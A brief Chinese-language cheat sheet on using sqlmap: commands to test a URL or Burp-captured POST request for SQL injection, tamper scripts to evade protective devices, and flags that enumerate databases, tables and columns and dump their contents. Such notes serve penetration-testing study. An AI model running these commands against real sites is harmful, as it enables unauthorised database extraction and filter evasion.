# Sql map useing
## 并非所有地方都可以通过sqlmap进行注入，有些需要进行手动注入
## 检查网站是否可以注入
```bash
sqlmap -u 'http://x.x.x.x/index.php?id=1'  # Get常规测试
# POST 方式常规测试，先导出为文本文件, 可使用burp抓包工具进行抓包
sqlmap -r ./post.txt -u 'http://x.x.x.x/index.php?id=1'

# ================================================================================================
sqlmap --list-tampers # 显示所有可用绕过防护设备的脚本
sqlmap -u 'http://x.x.x.x/index.php?id=1' -tamper=xxxx.py # 使用xxxx脚本绕过防护设备
sqlmap -u 'http://x.x.x.x/index.php?id=1' -tamper=xxxx.py --level=4 # 

# ================================================================================================
# 常用参数
--dbs         # 列出所有数据库
--current-db  # 列出当前使用的数据库
-D            # 指定数据库
--tables      # 列出所有表名
-T            # 指定表名
--columns     # 列出所有字段
-C            # 指定字段名称
--dump        # 列出字段内容


```
